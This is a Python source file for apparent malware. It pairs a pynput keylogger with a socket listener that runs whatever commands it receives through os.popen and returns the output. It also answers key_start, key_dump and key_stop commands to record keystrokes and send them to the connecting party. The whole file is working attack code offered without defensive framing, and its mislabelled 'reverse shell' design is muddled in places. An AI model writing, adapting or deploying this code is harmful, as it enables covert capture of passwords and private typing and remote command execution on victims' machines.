import socket
import threading
import pynput
from pynput.keyboard import Listener
import time
import os

# Global variable for storing key logs
key_logs = []

# Function to capture keystrokes using pynput
def on_press(key):
    try:
        key_logs.append(str(key.char))  # Regular character keys
    except AttributeError:
        key_logs.append(f"[{key}]")  # Special keys (e.g., space, enter)

# Keylogger commands
def keylogger_commands(connection):
    global key_logs
    while True:
        command = connection.recv(1024).decode()  # Receive command from the reverse shell
        if command == "key_start":
            # Start the keylogger
            connection.send("Keylogger started.".encode())
            with Listener(on_press=on_press) as listener:
                listener.join()
        elif command == "key_dump":
            # Dump the keylogs
            if key_logs:
                logs = "".join(key_logs)
                connection.send(logs.encode())
            else:
                connection.send("No logs yet.".encode())
        elif command == "key_stop":
            # Stop the keylogger
            connection.send("Keylogger stopped.".encode())
            break
        time.sleep(1)

# Reverse shell server that accepts incoming connections
def reverse_shell_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)  # Listen for incoming connections
    print(f"Listening for incoming connections on {host}:{port}...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")

        try:
            while True:
                # Receive a command from the reverse shell
                command = client_socket.recv(1024).decode()
                if not command:
                    break  # No command, break out of the loop
                
                if command.lower() == "exit":
                    client_socket.close()
                    break
                elif command.lower().startswith("key_"):
                    keylogger_commands(client_socket)
                else:
                    # Execute system commands
                    result = os.popen(command).read()
                    client_socket.send(result.encode())
        except Exception as e:
            print(f"Error: {e}")
            client_socket.close()

# Start the server to listen for incoming reverse shell connections
if __name__ == "__main__":
    reverse_shell_server()
